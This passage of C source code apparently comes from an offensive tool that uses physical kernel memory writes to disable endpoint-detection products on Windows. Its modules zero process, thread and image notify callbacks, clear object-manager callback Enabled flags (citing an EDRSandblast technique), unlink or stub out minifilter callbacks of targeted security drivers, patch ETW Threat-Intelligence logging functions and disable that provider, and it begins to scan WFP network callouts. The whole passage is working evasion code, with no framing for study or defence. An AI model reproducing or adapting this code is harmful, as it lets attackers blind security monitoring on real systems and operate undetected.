    for(uint64_t cpa=drv_pa;cpa<drv_pa+drv_sz;cpa+=CHUNK_SZ){
        uint64_t csz=drv_pa+drv_sz-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
        if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
        for(uint64_t off=0;off+6<=csz;off++){
            if(g_chunk[off]!=0xFF||g_chunk[off+1]!=0x15) continue;
            uint64_t iv=drv_va+(cpa-drv_pa)+off; uint64_t nr=iv+6;
            int32_t d=*(int32_t*)(g_chunk+off+2); uint64_t iat=nr+(uint64_t)(int64_t)d;
            if(iat<drv_va||iat>=drv_va+drv_sz) continue;
            uint64_t iat_pa=drv_pa+(iat-drv_va); if(!pa_in_range(iat_pa,8)) continue;
            uint64_t resolved=0; if(!phys_read(iat_pa,&resolved,8)||!resolved) continue;
            int match=-1;
            for(int j=0;j<g_wk_nvas;j++) if(g_wk_vas[j]&&resolved==g_wk_vas[j]){match=j;break;}
            if(match<0) continue;
            uint64_t call_pa=cpa+off; int dup=0;
            for(int j=0;j<g_wk_n;j++) if(g_wk[j].call_pa==call_pa){dup=1;break;}
            if(dup||g_wk_n>=WK_MAX) continue;
            WkSite *s=&g_wk[g_wk_n++];
            s->call_pa=call_pa; s->call_va=iv; s->drv_va=drv_va; s->iat_va=iat; s->target_va=resolved;
            s->func_name=WK_FUNCS[match]; strncpy(s->drv,name,63); s->drv[63]='\0'; s->patched=0;
            memset(s->orig,0,6); phys_read(call_pa,s->orig,6);
            printf("      +0x%06llX  CALL→%-42s\n",(unsigned long long)(iv-drv_va),WK_FUNCS[match]);
        }
    }
}

static int wk_apply(void)
{
    int ok=0;
    for(int i=0;i<g_wk_n;i++){
        if(phys_write(g_wk[i].call_pa,WKPATCH,6)){
            uint8_t rb[6]={0}; phys_read(g_wk[i].call_pa,rb,6);
            if(memcmp(rb,WKPATCH,6)==0){g_wk[i].patched=1;ok++;}
        }
    }
    return ok;
}
static void wk_restore(void)
{
    for(int i=0;i<g_wk_n;i++){
        if(!g_wk[i].patched) continue;
        uint8_t cur[6]={0};
        if(phys_read(g_wk[i].call_pa,cur,6)&&memcmp(cur,WKPATCH,6)==0)
            phys_write(g_wk[i].call_pa,g_wk[i].orig,6);
        g_wk[i].patched=0;
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §3  MODULE: PS* NOTIFY CALLBACKS
 * ══════════════════════════════════════════════════════════════════════ */

typedef struct { uint64_t entry_pa; uint64_t orig_val; int zeroed; } PsSavedEntry;
typedef struct {
    const char *name; const char *setter; int max;
    uint64_t array_va, array_pa;
    PsSavedEntry entries[64]; int n_saved;
} PsArray;
static PsArray g_ps[3]={
    {"PspCreateProcessNotifyRoutine","PsSetCreateProcessNotifyRoutine",64,0,0,{},0},
    {"PspLoadImageNotifyRoutine",    "PsSetLoadImageNotifyRoutine",     8,0,0,{},0},
    {"PspCreateThreadNotifyRoutine", "PsSetCreateThreadNotifyRoutine", 64,0,0,{},0},
};

static uint64_t ps_find_array(const uint8_t *pe, size_t pe_sz,
                               uint64_t nt_pa, uint64_t nt_va, uint64_t nt_size,
                               const char *setter,
                               const uint64_t *excl, int nexcl)
{
    uint32_t rva=pe_export_rva(pe,pe_sz,setter); if(!rva) return 0;
    uint64_t nt_end=nt_va+(nt_size?nt_size:pe_sz);
    uint64_t best=0; int best_score=-1;

    /* Build scan list: setter + callees reachable via E8/E9 in setter body.
     * On Windows 11, PsSetCreate*NotifyRoutine is a thin wrapper — the LEA
     * referencing PspCreate*NotifyRoutine lives in the callee, not the setter. */
    uint32_t scan[8]; int nscan=0;
    scan[nscan++]=rva;
    {
        uint8_t hd[512]={0}; phys_read(nt_pa+rva,hd,sizeof hd);
        for(int i=0;i<(int)sizeof(hd)-5;i++){
            if(hd[i]!=0xE8&&hd[i]!=0xE9) continue; /* CALL/JMP rel32 */
            int32_t d=*(int32_t*)(hd+i+1);
            uint64_t tv=(uint64_t)((int64_t)(nt_va+rva+i+5)+d);
            if(tv<nt_va||tv>=nt_end) continue;
            uint32_t tr=(uint32_t)(tv-nt_va);
            int dup=0; for(int k=0;k<nscan;k++) if(scan[k]==tr){dup=1;break;}
            if(!dup&&nscan<8) scan[nscan++]=tr;
        }
    }

    for(int si=0;si<nscan;si++){
        uint8_t code[1024]={0};
        uint32_t crva=scan[si];
        if(!phys_read(nt_pa+crva,code,sizeof code)) continue;
        for(int i=0;i<(int)sizeof(code)-7;i++){
            if((code[i]!=0x48&&code[i]!=0x4C)||code[i+1]!=0x8D||(code[i+2]&0xC7)!=0x05) continue;
            int32_t disp=*(int32_t*)(code+i+3);
            uint64_t tgt=(uint64_t)((int64_t)(nt_va+crva+i+7)+disp);
            if(tgt<nt_va||tgt>=nt_end) continue;
            /* No rva_in_data_section check — content validation below is sufficient */
            /* Exclusion check: skip VAs already claimed by a previous Ps* array */
            int excl_hit=0; for(int xi=0;xi<nexcl;xi++) if(tgt==excl[xi]){excl_hit=1;break;}
            if(excl_hit) continue;
            uint64_t tpa=nt_pa+(tgt-nt_va); uint64_t e[64]={0};
            if(!phys_read(tpa,e,64*8)) continue;
            int valid=1,nn=0,np=0;
            for(int j=0;j<64;j++){if(!e[j]){nn++;continue;}if((e[j]>>48)!=0xFFFFULL){valid=0;break;}np++;}
            if(!valid) continue;
            int score=nn+np*10;
            if(score>best_score){best_score=score;best=tgt;}
        }
    }
    return (best&&best_score>=3)?best:0;
}

static int ps_zero(PsArray *arr)
{
    int ok=0; uint64_t z=0;
    for(int i=0;i<arr->max&&arr->n_saved<64;i++){
        uint64_t epa=arr->array_pa+(uint64_t)i*8; uint64_t v=0;
        if(!phys_read(epa,&v,8)||!v) continue;
        arr->entries[arr->n_saved].entry_pa=epa;
        arr->entries[arr->n_saved].orig_val=v;
        arr->entries[arr->n_saved].zeroed=phys_write(epa,&z,8);
        if(arr->entries[arr->n_saved].zeroed) ok++;
        arr->n_saved++;
    }
    return ok;
}
static void ps_restore(PsArray *arr)
{
    for(int i=0;i<arr->n_saved;i++){
        if(!arr->entries[i].zeroed) continue;
        uint64_t cur=0;
        if(phys_read(arr->entries[i].entry_pa,&cur,8)&&cur==0)
            phys_write(arr->entries[i].entry_pa,&arr->entries[i].orig_val,8);
        arr->entries[i].zeroed=0;
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §4  MODULE: OB REGISTER CALLBACKS
 * ══════════════════════════════════════════════════════════════════════ */

#define OB_MAX 256
typedef struct {
    uint64_t preop_pa, postop_pa, preop_va, postop_va, objtype_va;
    uint64_t enabled_pa;              /* PA of OB_CALLBACK_ENTRY.Enabled BOOL */
    char drv[64];
    uint8_t orig_pre[8],orig_post[8];
    uint8_t orig_en[4];               /* saved Enabled value for restore */
    int zeroed;
} ObEntry;
static ObEntry g_ob[OB_MAX]; static int g_ob_n=0;

static int ob_try(uint64_t cpa, uint64_t off, uint64_t csz)
{
    if(off<0x28||off+0x10>csz) return 0;
    uint64_t preop=*(uint64_t*)(g_chunk+off), postop=*(uint64_t*)(g_chunk+off+0x08);
    uint64_t pr=0; const char *pd=va_to_driver_ex(preop,&pr); if(!pd||!pr||pr>=MAX_SANE_RVA) return 0;
    if(postop){uint64_t qr=0;const char *qd=va_to_driver_ex(postop,&qr);if(!qd||strcmp(qd,pd)||!qr||qr>=MAX_SANE_RVA) return 0;if(preop==postop) return 0;}
    uint32_t ops=*(uint32_t*)(g_chunk+off-0x18); if(ops<1||ops>3) return 0;
    uint32_t en=*(uint32_t*)(g_chunk+off-0x14); if(!en||(en>>8)) return 0;
    uint64_t reg=*(uint64_t*)(g_chunk+off-0x10); if((reg>>48)!=0xFFFFULL||va_in_any_module(reg)||reg&7) return 0;
    uint64_t ot=*(uint64_t*)(g_chunk+off-0x08); if((ot>>48)!=0xFFFFULL||va_in_any_module(ot)||ot&7) return 0;
    uint64_t fl=*(uint64_t*)(g_chunk+off-0x28),bl=*(uint64_t*)(g_chunk+off-0x20);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
    if(va_in_any_module(fl)||va_in_any_module(bl)) return 0;
    uint64_t ppa=cpa+off;
    for(int i=0;i<g_ob_n;i++) if(g_ob[i].preop_pa==ppa) return 0;
    if(g_ob_n>=OB_MAX) return 0;
    ObEntry *e=&g_ob[g_ob_n++];
    e->preop_pa=ppa; e->postop_pa=ppa+8; e->preop_va=preop; e->postop_va=postop; e->objtype_va=ot;
    e->enabled_pa=cpa+off-0x14; /* OB_CALLBACK_ENTRY.Enabled at struct+0x14, preop at struct+0x28 */
    strncpy(e->drv,pd,63); e->drv[63]='\0'; e->zeroed=0;
    return 1;
}
/* OB anc=0x20 variant (older/alt layout: no Entry ptr between Ops and ObjectType) */
static int ob_try_20(uint64_t cpa, uint64_t off, uint64_t csz)
{
    if(off<0x20||off+0x10>csz) return 0;
    uint64_t preop=*(uint64_t*)(g_chunk+off),postop=*(uint64_t*)(g_chunk+off+8);
    uint64_t pr=0; const char *pd=va_to_driver_ex(preop,&pr);
    if(!pd||!pr||pr>=MAX_SANE_RVA) return 0;
    if(postop){uint64_t qr=0;const char *qd=va_to_driver_ex(postop,&qr);if(!qd||strcmp(qd,pd)||!qr||qr>=MAX_SANE_RVA) return 0;}
    uint32_t ops=*(uint32_t*)(g_chunk+off-0x10); if(ops<1||ops>3) return 0;
    uint64_t ot=*(uint64_t*)(g_chunk+off-0x08); if((ot>>48)!=0xFFFFULL||va_in_any_module(ot)||ot&7) return 0;
    uint64_t fl=*(uint64_t*)(g_chunk+off-0x20),bl=*(uint64_t*)(g_chunk+off-0x18);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
    if(va_in_any_module(fl)||va_in_any_module(bl)) return 0;
    uint64_t ppa=cpa+off;
    for(int i=0;i<g_ob_n;i++) if(g_ob[i].preop_pa==ppa) return 0;
    if(g_ob_n>=OB_MAX) return 0;
    ObEntry *e=&g_ob[g_ob_n++];
    e->preop_pa=ppa; e->postop_pa=ppa+8; e->preop_va=preop; e->postop_va=postop; e->objtype_va=ot;
    e->enabled_pa=cpa+off-0x0C; /* Enabled at struct+0x14, preop at struct+0x20 → off-0x0C */
    strncpy(e->drv,pd,63); e->drv[63]='\0'; e->zeroed=0;
    return 1;
}
static void ob_scan(void){} /* replaced by combined_pool_scan (defined after all modules) */

static int ob_apply_edr(void)
{
    int ok=0;
    for(int i=0;i<g_ob_n;i++){
        ObEntry *e=&g_ob[i];
        if(!is_edr_target(e->drv)) continue;
        /* EDRSandblast technique 1: clear the Enabled flag in OB_CALLBACK_ENTRY.
         * Fallback to zeroing PreOperation pointer if enabled_pa is unusable. */
        if(e->enabled_pa && pa_in_range(e->enabled_pa,4)){
            phys_read(e->enabled_pa,e->orig_en,4);
            uint32_t z=0;
            if(phys_write(e->enabled_pa,&z,4)){e->zeroed=1;ok++;}
        } else {
            uint64_t z=0;
            phys_read(e->preop_pa,e->orig_pre,8);
            if(phys_write(e->preop_pa,&z,8)){e->zeroed=1;ok++;}
        }
    }
    return ok;
}
static void ob_restore(void)
{
    for(int i=0;i<g_ob_n;i++){
        ObEntry *e=&g_ob[i]; if(!e->zeroed) continue;
        if(e->enabled_pa && pa_in_range(e->enabled_pa,4)){
            uint32_t cur=0;
            if(phys_read(e->enabled_pa,&cur,4)&&cur==0)
                phys_write(e->enabled_pa,e->orig_en,4);
        } else {
            uint64_t cur=0;
            if(phys_read(e->preop_pa,&cur,8)&&cur==0)
                phys_write(e->preop_pa,e->orig_pre,8);
        }
        e->zeroed=0;
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §5  MODULE: FLT MINIFILTER
 * ══════════════════════════════════════════════════════════════════════ */

#define FLT_MAX_RAW 16384
#define FLT_MAX_GRP 64
#define FLT_MAX_NODES 96
#define FLT_MIN_VOTES 5

typedef struct {
    uint64_t preop_pa,postop_pa,preop,postop,filter;
    uint8_t  anchor;
    uint8_t  raw64[64];         /* raw struct bytes from start (raw64[0..7]=Flink, [8..15]=Blink) */
    uint8_t  _p[7];
    /* List-unlink data — populated in flt_apply_edr when g_kernel_cr3 is available */
    uint64_t flink_va, blink_va;     /* LIST_ENTRY Flink / Blink values read from raw64 */
    uint64_t ulpf_pa, ulnb_pa;      /* PA of PREV.Flink and NEXT.Blink for restore */
    uint64_t ulpf_orig, ulnb_orig;  /* original values saved before unlink */
    int      unlinked;
} FltNode;
typedef struct {
    uint64_t filter_va; char driver[64]; DrvClass cls;
    int n; int patched; FltNode nodes[FLT_MAX_NODES];
} FltGroup;

static FltNode   *g_flt_raw=NULL; static int g_flt_n_raw=0;
static FltGroup   g_flt_grp[FLT_MAX_GRP]; static int g_flt_n_grp=0;

#define FLT_PFMAX 256
typedef struct{uint64_t func_va,func_pa;uint8_t orig[3];char drv[64];}FltPFunc;
static FltPFunc g_flt_pf[FLT_PFMAX]; static int g_flt_n_pf=0;

static int flt_try(uint64_t cpa, uint64_t off, uint8_t anc, uint64_t csz)
{
    if(off<(uint64_t)anc||off+0x10>csz) return 0;
    uint64_t preop=*(uint64_t*)(g_chunk+off); uint64_t pr=0;
    const char *pd=va_to_driver_ex(preop,&pr); if(!pd||!pr||pr>=MAX_SANE_RVA) return 0;
    uint64_t flink=*(uint64_t*)(g_chunk+off-anc),blink=*(uint64_t*)(g_chunk+off-anc+8);
    uint64_t filter=*(uint64_t*)(g_chunk+off-anc+0x10);
    uint64_t postop=*(uint64_t*)(g_chunk+off+8);
    if(flink<0xFFFF800000000000ULL||blink<0xFFFF800000000000ULL||filter<0xFFFF800000000000ULL) return 0;
    if(postop&&postop<0xFFFF800000000000ULL) return 0;
    if(filter&7||preop&3) return 0;
    if((filter>>32)>=0xFFFFF800ULL&&(filter>>32)<=0xFFFFFBFFULL) return 0;
    if(va_to_driver(filter)) return 0;
    if(postop){uint64_t qr=0;const char *qd=va_to_driver_ex(postop,&qr);if(!qd||strcmp(qd,pd)||!qr||qr>=MAX_SANE_RVA) return 0;}
    if(postop&&preop==postop) return 0;
    uint64_t pa=cpa+off;
    for(int d=0;d<g_flt_n_raw;d++) if(g_flt_raw[d].preop_pa==pa) return 0;
    if(g_flt_n_raw>=FLT_MAX_RAW) return 0;
    FltNode *nd=&g_flt_raw[g_flt_n_raw++];
    nd->preop_pa=pa; nd->postop_pa=pa+8; nd->preop=preop; nd->postop=postop; nd->filter=filter; nd->anchor=anc;
    uint64_t bo=off-anc; uint32_t cap=(csz-bo>64)?64:(uint32_t)(csz-bo);
    memcpy(nd->raw64,g_chunk+bo,cap); if(cap<64) memset(nd->raw64+cap,0,64-cap);
    nd->flink_va=*(uint64_t*)nd->raw64;         /* LIST_ENTRY.Flink = NEXT node's LIST_ENTRY VA */
    nd->blink_va=*(uint64_t*)(nd->raw64+8);     /* LIST_ENTRY.Blink = PREV node's LIST_ENTRY VA */
    nd->unlinked=0;
    return 1;
}
static void flt_scan_stage1(void)
{
    g_flt_n_raw=0; uint64_t lp=0; const uint8_t ancs[3]={0x20,0x18,0x28};
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(g_flt_n_raw>=FLT_MAX_RAW) goto flt1_done;
            if(cpa-lp>=0x80000000ULL){printf("  [%5lluMB] flt=%d\r",(unsigned long long)(cpa>>20),g_flt_n_raw);fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0x28;off+0x10<=csz&&g_flt_n_raw<FLT_MAX_RAW;off+=8)
                for(int ai=0;ai<3;ai++) if(flt_try(cpa,off,ancs[ai],csz)) break;
        }
    }
flt1_done:;
}
static void flt_scan_stage2(void)
{
    typedef struct{uint64_t v;int c;}FE;
    FE *freq=(FE*)calloc(g_flt_n_raw,sizeof(FE)); if(!freq) return; int nf=0;
    for(int i=0;i<g_flt_n_raw;i++){
        int f=0;
        for(int j=0;j<nf;j++) if(freq[j].v==g_flt_raw[i].filter){freq[j].c++;f=1;break;}
        if(!f){freq[nf].v=g_flt_raw[i].filter;freq[nf].c=1;nf++;}
    }
    for(int i=1;i<nf;i++){FE k=freq[i];int j=i-1;while(j>=0&&freq[j].c<k.c){freq[j+1]=freq[j];j--;}freq[j+1]=k;}
    g_flt_n_grp=0;
    for(int j=0;j<nf&&g_flt_n_grp<FLT_MAX_GRP;j++){
        if(freq[j].c<FLT_MIN_VOTES) break;
        FltGroup *grp=&g_flt_grp[g_flt_n_grp];
        grp->filter_va=freq[j].v; grp->driver[0]='\0'; grp->n=0; grp->patched=0;
        /* majority vote for driver name */
        typedef struct{const char*n;int c;}DV; DV votes[32]; int nv=0;
        for(int i=0;i<g_flt_n_raw;i++){
            if(g_flt_raw[i].filter!=freq[j].v) continue;
            const char *dn=va_to_driver(g_flt_raw[i].preop); if(!dn) continue;
            int f=0; for(int k=0;k<nv;k++) if(strcmp(votes[k].n,dn)==0){votes[k].c++;f=1;break;}
            if(!f&&nv<32){votes[nv].n=dn;votes[nv].c=1;nv++;}
        }
        if(nv>0){int best=0;for(int k=1;k<nv;k++) if(votes[k].c>votes[best].c) best=k;strncpy(grp->driver,votes[best].n,63);grp->driver[63]='\0';}
        for(int i=0;i<g_flt_n_raw&&grp->n<FLT_MAX_NODES;i++){
            if(g_flt_raw[i].filter!=freq[j].v) continue;
            const char *dn=va_to_driver(g_flt_raw[i].preop);
            if(!dn||strcmp(dn,grp->driver)) continue;
            grp->nodes[grp->n++]=g_flt_raw[i];
        }
        if(grp->n<FLT_MIN_VOTES){grp->driver[0]='\0';grp->n=0;continue;}
        grp->cls=classify_driver(grp->driver[0]?grp->driver:"");
        g_flt_n_grp++;
    }
    free(freq);
}
static int flt_patch_func(uint64_t func_va, uint64_t drv_pa, uint64_t drv_va, const char *name)
{
    if(!drv_pa||g_flt_n_pf>=FLT_PFMAX) return 0;
    for(int i=0;i<g_flt_n_pf;i++) if(g_flt_pf[i].func_va==func_va) return 0; /* already patched */
    uint32_t rva=(uint32_t)(func_va-drv_va); uint64_t fpa=drv_pa+rva;
    if(!pa_in_range(fpa,3)) return 0;
    FltPFunc *pf=&g_flt_pf[g_flt_n_pf];
    if(!phys_read(fpa,pf->orig,3)) return 0;
    if(pf->orig[0]==0xC3) return 0;
    if(!phys_write(fpa,PATCH3,3)) return 0;
    pf->func_va=func_va; pf->func_pa=fpa; strncpy(pf->drv,name,63); pf->drv[63]='\0'; g_flt_n_pf++;
    return 1;
}
static int flt_apply_edr(void)
{
    int total=0;
    /* Driver dedup: skip groups for drivers already patched by an earlier group */
    char done[FLT_MAX_GRP][64]; int ndone=0;

    for(int gi=0;gi<g_flt_n_grp;gi++){
        FltGroup *grp=&g_flt_grp[gi];
        if(grp->cls!=DRV_OTHER) continue;
        if(!is_edr_target(grp->driver)) continue;

        /* If same driver was fully processed by an earlier group, just mark patched */
        int already=0;
        for(int k=0;k<ndone;k++) if(_stricmp(done[k],grp->driver)==0){already=1;break;}
        if(already){grp->patched=1;continue;}

        /* collect unique preop VAs */
        uint64_t uniq[FLT_MAX_NODES]; int nu=0;
        for(int i=0;i<grp->n;i++){
            int f=0; for(int j=0;j<nu;j++) if(uniq[j]==grp->nodes[i].preop){f=1;break;}
            if(!f&&nu<FLT_MAX_NODES) uniq[nu++]=grp->nodes[i].preop;
        }
        uint64_t drv_va=0;
        for(int m=1;m<g_nmods;m++) if(_stricmp(g_mods[m].name,grp->driver)==0){drv_va=g_mods[m].base;break;}
        /* use cached PA to avoid repeated full physical scan for same driver */
        int ok=0;

        if(g_kernel_cr3){
            /* ── Method A: unlink callback nodes from FltMgr's per-IRP lists ─
             * Traverses each unique node, finds PREV.Flink and NEXT.Blink via
             * page-table walk, then stitches PREV→NEXT (skipping EDR's node).
             * Filter Manager will no longer call this driver's callback for any
             * I/O on any volume. Cleaner than code-patching: no disk/memory
             * mismatch, no driver-PA scan needed.                              */
            int nuniq=0;
            uint64_t seen_preop[FLT_MAX_NODES];
            for(int j=0;j<grp->n;j++){
                FltNode *nd=&grp->nodes[j];
                if(!nd->flink_va||!nd->blink_va||nd->unlinked) continue;
                /* Dedup by preop VA so we don't double-unlink the same node */
                int dup=0;
                for(int k=0;k<nuniq;k++) if(seen_preop[k]==nd->preop){dup=1;break;}
                if(dup) continue;
                if(nuniq<FLT_MAX_NODES) seen_preop[nuniq++]=nd->preop;

                uint64_t pfpa=va_to_pa(nd->blink_va);    /* PA of PREV.Flink */
                uint64_t nbpa=va_to_pa(nd->flink_va+8);  /* PA of NEXT.Blink */
                if(!pfpa||!nbpa) continue;
                if(!phys_read(pfpa,&nd->ulpf_orig,8)) continue;
                if(!phys_read(nbpa,&nd->ulnb_orig,8)) continue;
                if(phys_write(pfpa,&nd->flink_va,8)&&phys_write(nbpa,&nd->blink_va,8)){
                    nd->ulpf_pa=pfpa; nd->ulnb_pa=nbpa; nd->unlinked=1; ok++;
                }
            }
            if(ok>0)
                printf("    %s: %d nodes unlinked from FltMgr callback lists\n",
                       grp->driver,ok);
            else
                printf("    %s: va_to_pa unavailable, falling back to code patch\n",
                       grp->driver);
        }

        if(!ok){
            /* ── Method B fallback: patch PreOp prologue to xor eax,eax;ret ── */
            uint64_t drv_pa=find_driver_pa_cached(grp->driver);
            if(!drv_pa&&nu>0&&drv_va){
                printf("    [!] MZ scan failed, trying prologue scan...\n");
                for(int j=0;j<nu&&!drv_pa&&j<4;j++) drv_pa=find_driver_pa_by_func(grp->driver,uniq[j],drv_va);
                if(drv_pa&&g_pa_n<PA_CACHE_MAX){strncpy(g_pa_cache[g_pa_n].n,grp->driver,63);g_pa_cache[g_pa_n++].pa=drv_pa;}
            }
            if(drv_pa){
                for(int j=0;j<nu;j++) if(flt_patch_func(uniq[j],drv_pa,drv_va,grp->driver)) ok++;
                if(ok) printf("    %s: %d/%d functions patched (fallback)\n",grp->driver,ok,nu);
            } else {
                printf("    [!] %s: driver PA not found — skipped\n",grp->driver);
            }
        }

        grp->patched=(ok>0);
        total+=ok;
        if(ndone<FLT_MAX_GRP){strncpy(done[ndone++],grp->driver,63);}
    }
    return total;
}
static void flt_restore(void)
{
    /* Restore code-patched PreOp prologues */
    for(int i=0;i<g_flt_n_pf;i++){
        FltPFunc *pf=&g_flt_pf[i]; uint8_t cur[3]={0};
        if(phys_read(pf->func_pa,cur,3)&&memcmp(cur,PATCH3,3)==0)
            phys_write(pf->func_pa,pf->orig,3);
    }
    /* Restore unlinked LIST_ENTRY nodes */
    for(int gi=0;gi<g_flt_n_grp;gi++){
        FltGroup *grp=&g_flt_grp[gi];
        for(int j=0;j<grp->n;j++){
            FltNode *nd=&grp->nodes[j]; if(!nd->unlinked) continue;
            phys_write(nd->ulpf_pa,&nd->ulpf_orig,8); /* restore PREV.Flink */
            phys_write(nd->ulnb_pa,&nd->ulnb_orig,8); /* restore NEXT.Blink */
            nd->unlinked=0;
        }
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §6  MODULE: ETW-TI
 * ══════════════════════════════════════════════════════════════════════ */

static const uint8_t ETW_TI_GUID[16]={0x7C,0x89,0xE1,0xF4,0x5D,0xBB,0x68,0x56,0xF1,0xD8,0x04,0x0F,0x4D,0x8D,0xD3,0x44};
static const char *ETW_TI_FUNCS[]={
    "EtwTiLogReadWriteVm","EtwTiLogAllocExecVm","EtwTiLogMapExecView",
    "EtwTiLogSetContextThread","EtwTiLogSuspendResumeProcess",
    "EtwTiLogOpenProcess","EtwTiLogOpenThread",NULL
};

typedef struct{const char *name;uint64_t func_pa;uint8_t orig[3];int ok;}EtwFn;
static EtwFn   g_etw_fns[16]; static int g_etw_n_fns=0;
static uint64_t g_etw_isen_pa=0; static uint32_t g_etw_isen_orig=0;

static int etw_patch_funcs(const uint8_t *pe, size_t pe_sz, uint64_t nt_pa)
{
    int ok=0;
    for(int i=0;ETW_TI_FUNCS[i]&&g_etw_n_fns<16;i++){
        uint32_t rva=pe_export_rva(pe,pe_sz,ETW_TI_FUNCS[i]); if(!rva) continue;
        uint64_t fpa=nt_pa+rva; if(!pa_in_range(fpa,3)) continue;
        EtwFn *pf=&g_etw_fns[g_etw_n_fns]; pf->name=ETW_TI_FUNCS[i]; pf->func_pa=fpa; pf->ok=0;
        if(!phys_read(fpa,pf->orig,3)){g_etw_n_fns++;continue;}
        if(pf->orig[0]==0||pf->orig[0]==PATCH3[0]){g_etw_n_fns++;continue;}
        if(!phys_write(fpa,PATCH3,3)){g_etw_n_fns++;continue;}
        uint8_t rb[3]={0}; phys_read(fpa,rb,3); pf->ok=(memcmp(rb,PATCH3,3)==0);
        if(pf->ok){ok++;printf("    %-40s  RVA=0x%06X  PATCHED\n",ETW_TI_FUNCS[i],rva);}
        g_etw_n_fns++;
    }
    return ok;
}
static int etw_disable_provider(void)
{
    static const uint32_t GOFF[]={0x28,0x20,0x18,0x30,0x38};
    uint64_t lp=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(cpa-lp>=0x80000000ULL){printf("  [%5lluMB]\r",(unsigned long long)(cpa>>20));fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0;off+16<=csz;off++){
                if(memcmp(g_chunk+off,ETW_TI_GUID,16)) continue;
                uint64_t gpa=cpa+off;
                for(int oi=0;oi<5;oi++){
                    uint32_t go=GOFF[oi]; if(gpa<go) continue;
                    uint64_t epa=gpa-go;
                    uint64_t fl=0,bl=0,sf=0;
                    phys_read(epa,&fl,8); phys_read(epa+8,&bl,8); phys_read(epa+16,&sf,8);
                    if(fl<0xFFFF800000000000ULL||bl<0xFFFF800000000000ULL||sf<0xFFFF800000000000ULL||fl==bl) continue;
                    uint64_t sd=0; phys_read(gpa+0x10,&sd,8);
                    if(sd&&sd<0xFFFF800000000000ULL) continue;
                    uint8_t region[0xC0]={0}; phys_read(epa,region,sizeof region);
                    uint32_t ss=go+0x18, se=go+0x80; if(se>(uint32_t)sizeof region) se=(uint32_t)sizeof region;
                    for(uint32_t d=ss;d+0x18<=se;d+=4){
                        uint32_t isen=*(uint32_t*)(region+d); if(isen!=1) continue;
                        uint8_t lv=region[d+4]; uint32_t lw=*(uint32_t*)(region+d+4);
                        if(lv>5||(lw>>8)) continue;
                        uint64_t ma=*(uint64_t*)(region+d+8); if(!ma) continue;
                        uint64_t mb=*(uint64_t*)(region+d+0x10); if(mb>ma) continue;
                        uint64_t tpa=epa+d; uint32_t z=0;
                        if(phys_write(tpa,&z,4)){
                            uint32_t rb=0; phys_read(tpa,&rb,4);
                            if(rb==0){
                                printf("    GUID@PA=0x%016llX  IsEnabled zeroed at +0x%03X\n",(unsigned long long)gpa,d);
                                g_etw_isen_pa=tpa; g_etw_isen_orig=1;
                                printf("  \n"); return 1;
                            }
                        }
                    }
                }
            }
        }
    }
    printf("  \n"); return 0;
}
static void etw_restore(void)
{
    for(int i=0;i<g_etw_n_fns;i++){
        EtwFn *pf=&g_etw_fns[i]; if(!pf->ok) continue;
        uint8_t cur[3]={0};
        if(phys_read(pf->func_pa,cur,3)&&memcmp(cur,PATCH3,3)==0) phys_write(pf->func_pa,pf->orig,3);
    }
    if(g_etw_isen_pa){uint32_t cur=0;if(phys_read(g_etw_isen_pa,&cur,4)&&cur==0) phys_write(g_etw_isen_pa,&g_etw_isen_orig,4);}
}

/* ══════════════════════════════════════════════════════════════════════
 * §7  MODULE: WFP CALLOUTS  (e.g. hrwfpdrv.sys, netio-registered callouts)
 *
 * _FWPS_CALLOUT internal structure (pool tag 'WfpC', approximate):
 *   +0x000  LIST_ENTRY  list           links into WFP callout list
 *   +0x010  GUID        calloutKey     unique GUID for this callout
 *   +0x020  UINT32      flags
 *   +0x024  UINT32      calloutId      WFP-assigned runtime ID (non-zero)
 *   +0x028  PVOID       classifyFn     ← scan anchor; zeroed to disable
 *   +0x030  PVOID       notifyFn       ← zeroed to disable
 *   +0x038  PVOID       flowDeleteFn   optional
 *   +0x040  PVOID       context
 *
 * Guards relative to classifyFn anchor:
 *   1. classifyFn in known driver (not netio/tcpip/ndis), RVA < 4MB
 *   2. notifyFn in same driver or NULL
 *   3. GUID at off-0x18: Data1 field non-zero (valid GUID)
 *   4. calloutId at off-0x04: non-zero UINT32
 *   5. Flink/Blink (off-0x28/off-0x20): kernel pool VAs, not in any module
 * ══════════════════════════════════════════════════════════════════════ */

#define WFP_MAX 1024
typedef struct{
    uint64_t struct_pa, classify_pa, notify_pa;
    uint64_t classify_va, notify_va;
    char drv[64]; uint8_t orig_cl[8], orig_nf[8]; int zeroed;
}WfpEntry;
static WfpEntry g_wfp[WFP_MAX]; static int g_wfp_n=0;

/* WFP-internal drivers that register callouts legitimately — skip them */
static int is_wfp_system_driver(const char *n)
{
    static const char *WFP_SYS[]={"netio.sys","tcpip.sys","afd.sys","ndis.sys",
        "mpsdrv.sys","MPDBASEDEVICE.sys","WdNisDrv.sys","wfplwfs.sys",NULL};
    for(int i=0;WFP_SYS[i];i++) if(_stricmp(n,WFP_SYS[i])==0) return 1;
    return 0;
}

static int wfp_try(uint64_t cpa, uint64_t off, uint64_t csz)
{
    /* anchor = classifyFn at struct+0x028, so off >= 0x28 */
    if(off<0x28||off+0x18>csz) return 0;
    uint64_t classify=*(uint64_t*)(g_chunk+off);
    uint64_t notify  =*(uint64_t*)(g_chunk+off+0x08);

